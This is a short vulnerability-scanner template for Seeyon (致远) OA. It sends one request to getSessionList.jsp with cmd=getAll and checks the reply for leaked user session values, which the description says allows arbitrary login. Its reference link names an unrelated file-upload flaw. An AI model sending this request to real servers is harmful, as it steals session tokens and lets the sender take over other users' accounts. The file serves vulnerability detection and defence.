id: zhiyuanOA-getSessionList-session-leak

info:
  name: 致远OA getSessionList.jsp Session泄漏漏洞
  author: cnaq
  severity: high  
  description: 通过使用存在漏洞的请求时，会回显部分用户的Session值，导致出现任意登录的情况
  reference: 
    - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20wpsAssistServlet%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
  tags: zhiyuanOA,session,leak

requests:
  - method: GET
    path:
      - "{{BaseURL}}/yyoa/ext/https/getSessionList.jsp?cmd=getAll"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "index.jsp"
        part: body
        negative: true

# 致远OA Session泄漏漏洞 # 360 浏览器看不到返回